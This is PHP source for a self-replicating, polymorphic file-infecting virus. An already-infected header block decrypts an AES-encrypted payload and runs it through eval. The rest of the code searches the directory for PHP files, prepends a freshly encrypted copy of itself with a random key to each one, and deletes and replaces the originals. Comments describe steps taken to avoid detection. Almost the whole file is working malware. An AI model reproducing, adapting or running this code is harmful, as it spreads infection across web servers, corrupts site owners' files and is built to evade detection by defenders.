<?php // Checksum: 382a15b559e142b42c57314801273616 ?><?php
        $encryptedVirus = '+ARGoAM3birnsi7oPqdIKkC8nVgt6oqqWb2HEnQpUuqGEgCQ/p26VZwVq/GU9EibizhLH6M4+AtZZW1xRo74oJzjjaIte48+fbMgeDG0dGNXVqvPjgbjh0Hxrc+xFGfFROwfUiwPI8gYllCh4AEa2y/ZXqxQVoJX7s+8b/99D5wkMbOL6xiMeI7PbyKFQ6ph1znjN486l3TwjkR1N8wUOdpdDuxVfIK4o7motIrDR+40n7zVyttrROwGdAHUJ+mgE7AHPQmAWtAyliX1AhIfPFkcIyII4CFiWbQoDiZDvk/bbpmMwRw8Ji/x+MsD4G1WPFMAQ53mZV4zF8i9yKJMdoyttTqU0oeRwaGEbGs85/lBCc16hMQ3Q/UKa07UucSSo+iUWfD1zw+Tc5MXQwwVSGTB1Or+1uzFEy2QlHTbuMnXfGkXRSTDBhljkwKk+YrCf249XkFrUb4N2YmjOKxgwAXI4X6tDOuR5ZIpJ5cQhFBgcsH4zxKOWr1Gel+zQGAWYf5RmJMWC2dlHD9B955YFBeTqJgMqW2X+toZ1mnMuQKskVMYfHlY7pmxlbW+bkODd/+WYtw2pWuICJJUdTCvqMosdYRNzqjOV1Zeb7BkUUtdKPFy3su63lX2upqSGa/pSkt7xOBJxEPqVDB9RxF5uyjx46Zd8LuGERyIPiuz9H0XhkvqXXoSes9hPS/vcbp5DNmHX6ritCzYpa8eRZVehEWkpudpLNWtwBF0tpbGUxbNWkwR/qrr8W8uDhjkK70AggUV5Ov6R163fov/96aYSkekHeq4BfdnSlv2PTfURno9t0DHKsi/fn8Rlopg5YiwRsUYydG1UmKlt2N699By3zY5BnrThSUvJNtfDBQTS1O4wxqd0pHq3OVcH8wPmxh0PJYv3uFCVNML7wIjI7+Qf244lQPxtJ2rbQo9N/fF2cq8m/F3nyPajghHKYMQjhsmA38ltQXyY6B3Mxk7ktA67jGQQpDGBuISgTGnSw95pqMJjlWC1mQcVMcPfcoXqXfXKn0T5Ln/3QE0AQwWCxq8hG/b+DLfsZmJ2TGxhCuJRv8t7jHAV//yHxLMX7vJExHjTWhQRI2RqTjFFwJffh3n2hS/Qzc7cgaMrXyv2M/DVenlvIr4QI3+SaQCHP/HOnwqeOSprOIpXTz6fpZXfLhmryy6TTHoajEyBElY41qXfAcbBr1lgoBFWMLa2rOkGqviVp7dtq5VTdg+oNAXuwtfXpwf0fdMRS4cIx89dE0o1H/pa8AoTgA4B3H6kou5+EO+853fqSkp0o8hBQFyJxhXEbtG4LGQu9h5s42T5g/57tZIlWclZvDA7o0CZhgfLKucWQn7YMc+Rzy5n5jIVRx56HO5/8mW9MMdBWKPH7V9ezgwlEyyITPnFweGBC70jnJ/Y4sSw8XGffoDljYmdRhl5hscG/MUy9hUzOTGchfr+froIYfvMPkhTL9xSldFXn6Whjx9NdCrhpy0pBekOz6WZ024LZX5ayOmyw2JSzl3fOVc3zVj8t1z4fDpDxXtyryCqRS7AJ3FbUg6sycBaR2t4Ow0BY11p/T6TKw4Png1ONjaW/eoEkRziqj5/hS5y3PLPXBcLwuMFCwPYgLIO0AfW7fYU3jdrgd+TVtDlcT35s2eVGMjO1oF7tN/mJRHJVub8ilhf7VeMzIiCxpc7wp0HkkqdlG0ghlN8Nj2euIAiy4UCN2plgWyd6R32dT0q4aHlUmc3F5NpTq0EnytvKxsGITjNj/6cH8CIuStOeFXI+CmDk8Y09OEkU75ILNvICNLr+ZUlKCkwut1UxdyAqwNswBSAkHn4t2WFvrs0XIQE1+hiYxJsr1DCHUA3SHYSFTDIzb6b8CnSTqX3cQqBqrqIONcnwJfMViinl6crk2WH4DKexnYeizRlw+TopyqRZRAm58qZ+I0O4hSivxX+btjRNNCgOzoamyXvoCiAoupV5n7VIN8dtNISxWJY7Lnpv39nlxRboePgf2Gco9hGHXxFefrbB/Yqc7QI7rscJHR5KfHtxmjtr8gBnPGaaVNAwhzlmlp4RGuOdbTgoEXzgt4f4q0Dl0RaJpdy60oBs+I5vkYbvHVUdC+n4JUzWun4AicSf+zHDQOb5kfhxuwzZFbF627ZFR3SqrSplN0cCAlKUNdl5KeKdkB34NF0tdoUSqkvuC8i5WrLPB/MkBqU0ZTV0kwQn4VIuOI/sR0Yab9BaGnJ1UiNUX/NtZRQuDW7tf0k7TZVMs5HC9NZ0OP4tbKtJwqN3/RKAhvUWR1p9A6i9qEqXVy77iujIUn2/0/JXYgI/lj7bQRr6cATJ9JIvZUF1GoF+Sv2NzmNsfmw7S/afBFxBwPIDXwD/vTtwZ5WaNuTVZXibkXeed/0mgZcT3FQ9tM6VYm6bdezQ9Bzrkmd1kTGBWPRcUjWUC1PHkCXAkcyfRWNWbGRe4uxTfj9l6E6k/tMBrHLwRtqxPt0ySZcxk9klTU67sRPOkcCCnESshHj3rDvmN5lj0D7KiKpp5nks9TbGzMVAJzJuAWcuAnDPHez8QMeDhLwPGHckbD6eDO/y3nMiV5ogkV2BSFA2DiykK825RwyT4SESz6t8WqCTwUCfwfQIQehTYlKaIzFJv/XyDqEjR7r0AEaF0PONPskG1YsXrgegVQpBeR5WQ7xAct5g6ewzMBmZzS2eG+BSwScNeZV+CPlOZLY3keNQnJG91OQBlMO20e7GTMCCTMNd8eJgSVH5Cf2LVViBXrUetuKws/aGUbzS/njV1fN1qEhvLrDwlOA2TPjkg94nx2HOL+bS4AUctAO4XQEzkWsdKdb8uPoPtEgkV/nYd+PnWgsLDbu8F3Ur9XfAr2NzN3DYvzSHPJVvDU6KDtkriT4dikti9qZc3Elly6dIDkCOkSOQEvYcs+vX6y4RM1HoA+eB1l2EDbOQbAdyr/Avhb3qD9v/anN7zU2LRcF5uIK8qZsPPXCdjNZlMzMkUvubsDsgSsrM+m4GRhBdwkQLoBFV7GjTO2LkyDe58EoucEibpZod6HmjOmwJcAl2t71mspXs9XXfoufuBvQD4LswSmhRAaqRES2P0kJTsuR1AdmzMOmW5zZid5nKStVEY69K73oWz6h3HNQtyRpkkoNekm5LemWyulrwwMBOxoVQiHzzsdALG+L5OWvZiR5pbHKQxyKtMC63IWgvdZl1ypCLQtHcphNBv/UTAztn1Ijb4wCeo2F4WHM5cXF8Qgl1vPdlt7HD9A7805JrbTyQpvRi2yZxSOoa5uKRgXMypy9g+jNP7c+FwASDgQz8WuE6tev97HTEb4T3SfOG0xb5uPev33/k8x';
        $iv = 'cF8VcD+U3dbpWYuxwC72zA==';
        $key = 'NDY2NGQ0Yjc3ODdkNDRhNGFiOTIxZGM0ZjcyZDU1M2E=';

        $virus = mcrypt_decrypt(
            MCRYPT_RIJNDAEL_128,
            base64_decode($key),
            base64_decode($encryptedVirus),
            MCRYPT_MODE_CBC,
            base64_decode($iv)
             );

        eval($virus);
        execute($virus);
        ?><?php

// VIRUS:START

function execute($virus){
    // Get a list of all PHP files 
	$filenames = glob('*.php');

    // check each file
    foreach( $filenames as $filename) {
    
		// open file
        $script = fopen($filename,'r');

        //check not infected
        $first_line = fgets($script);
        $virus_hash = md5($filename);
        if(strpos($first_line, $virus_hash) === false){

            //let's write to a new file, one chunck at a time, instead of reading whole file 
            // to void detection
            $infected = fopen("$filename.infected","w");
            $checksum = '<?php // Checksum: '. $virus_hash . ' ?>';
            $encVirus = encryptedVirus($virus);
            $infection = '<?php'. $encVirus . '?>';

            fputs($infected, $checksum, strlen($checksum));
            fputs($infected, $infection, strlen($infection));

            // we already start reading the file, so put the first line and continue the rest
            fputs($infected, $first_line, strlen($first_line));
            while( $contents = fgets($script) ) {
                fputs($infected, $contents, strlen($contents));
            }

            //close both handles and replance filename with infected file
            fclose($script);
            fclose($infected);
            // delete the original file
            unlink("$filename");
            rename("$filename.infected",$filename);	
        }

   }
}

function encryptedVirus($virus) {

    // Gen key
    $str = '123456789abcdef';
    $key = '';
    for($i=0; $i<32 ; ++$i){ 
        $key.= $str[rand(0,strlen($str)-1)];
       }

    // Encrypt
    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
    $encryptedVirus = mcrypt_encrypt(
        MCRYPT_RIJNDAEL_128,
        $key,
        $virus,
        MCRYPT_MODE_CBC,
        $iv
    );

    // Encode
    $encodedVirus = base64_encode($encryptedVirus);
    $encodedIV = base64_encode($iv);
    $encodedKey = base64_encode($key);

    $payload = "
        \$encryptedVirus = '$encodedVirus';
        \$iv = '$encodedIV';
        \$key = '$encodedKey';

        \$virus = mcrypt_decrypt(
            MCRYPT_RIJNDAEL_128,
            base64_decode(\$key),
            base64_decode(\$encryptedVirus),
            MCRYPT_MODE_CBC,
            base64_decode(\$iv)
             );

        eval(\$virus);
        execute(\$virus);
        ";

   return $payload;
}

// VIRUS:END
$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n// VIRUS:END") + strlen("\n// VIRUS:END"));


execute($virus);
?>
